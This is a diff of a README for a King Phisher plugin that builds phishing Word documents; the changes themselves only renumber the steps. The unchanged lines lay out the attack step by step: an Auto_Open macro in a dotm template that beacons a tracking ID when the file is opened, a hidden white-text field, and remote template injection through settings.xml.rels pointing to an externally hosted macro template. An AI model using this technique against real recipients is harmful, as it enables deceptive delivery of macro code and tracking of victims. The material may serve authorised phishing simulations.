@@ -12,11 +12,11 @@ you can run below command in install king-phisher directory for example, suppose
     pipenv install docxtpl
     
 # Local install
-1- Locate the docx_generator folder in the following path:
+1. Locate the docx_generator folder in the following path:
 
     $HOME/.config/king-phisher/plugins
     
-2- File mailer.py is located in the following path:
+2. File mailer.py is located in the following path:
 
     /opt/king-phisher/king_phisher/client/mailer.py
     
@@ -96,11 +96,11 @@ Put the following code in the mailer.py file
       template_vars.update(template_environment.standard_variables)
       return template_vars
       
-3- run server and client of king-phisher. In the client, enter the plugin manager dialog from tools -> manage plugins. From the local install section, check the install and enable docx_generator.
+3. run server and client of king-phisher. In the client, enter the plugin manager dialog from tools -> manage plugins. From the local install section, check the install and enable docx_generator.
 
 note: docx_generator and pdf_generator can not be activated at the same time
 
-4- create a dotm template with macro on it. in the macro send uid (The unique tracking identifier ) to the landing page when open document file. sample code:
+4. create a dotm template with macro on it. in the macro send uid (The unique tracking identifier ) to the landing page when open document file. sample code:
 
     Sub Auto_Open()
         expl
@@ -127,12 +127,12 @@ note: docx_generator and pdf_generator can not be activated at the same time
 
     End Function
 
-5- Create the Word file with the template defined in the previous step and just write the following command in it and whiten its color. 
+5. Create the Word file with the template defined in the previous step and just write the following command in it and whiten its color. 
 
     {{ secret_id }}
   
 
-6- After completing these steps, you place the template file created in step 4 on the server and change its premission so that it can be downloaded by everyone. Then you have to put the address of this file in the created Word file.To do this, zip the Word file and extract it and go to the following path:
+6. After completing these steps, you place the template file created in step 4 on the server and change its premission so that it can be downloaded by everyone. Then you have to put the address of this file in the created Word file.To do this, zip the Word file and extract it and go to the following path:
 
     word_rels\settings.xml.rels
     
@@ -141,4 +141,4 @@ And replace the dotm file address with its local address in the Target section. 
     <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
     <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://[web_server_address]/[name].dotm" TargetMode="External"/>     </Relationships>
 
-7- create your campaign and attach your docx file and enjoy it
+7. create your campaign and attach your docx file and enjoy it
